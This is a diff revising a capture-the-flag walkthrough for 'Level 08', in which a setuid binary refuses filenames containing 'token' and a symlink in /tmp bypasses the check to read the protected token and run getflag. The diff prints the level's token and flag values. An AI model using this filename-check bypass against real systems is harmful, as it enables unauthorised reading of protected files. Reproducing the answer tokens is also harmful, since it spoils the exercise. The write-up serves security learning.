@@ -1,13 +1,24 @@
 # Level 08
 
-Nm on the exec says: read, printf, open, so we can assumes it comports like a cat.
+A binary with flag08 permissions and a token can be found in the directory
 
-We try to read the token: You may not access './token'. We find back this on strings command: You may not access '%s', with the world token before. Weird.
+```bash
+ltrace ./level08 token
+__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
+strstr("token", "token")                                                  = "token"
+printf("You may not access '%s'\n", "token"You may not access 'token'
+)                              = 27
+exit(1 <unfinished ...>
++++ exited (status 1) +++
+```
 
-By using r2, we find that the programs call strstr and compare it with the string `token`.
+There is a hardcoded check for token filename that prevents execution. By creating a symbolic link to the token we can run the script.
 
-So maybe we can read the file if it's not called with token.
+```bash
+ln -s /home/user/level08/token /tmp/link
+./level08 /tmp/link
+# quif5eloekouj29ke0vouxean
 
-ln -s token res
-
-We get the token for the flag08 user noice: quif5eloekouj29ke0vouxean
+getflag
+# Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+```
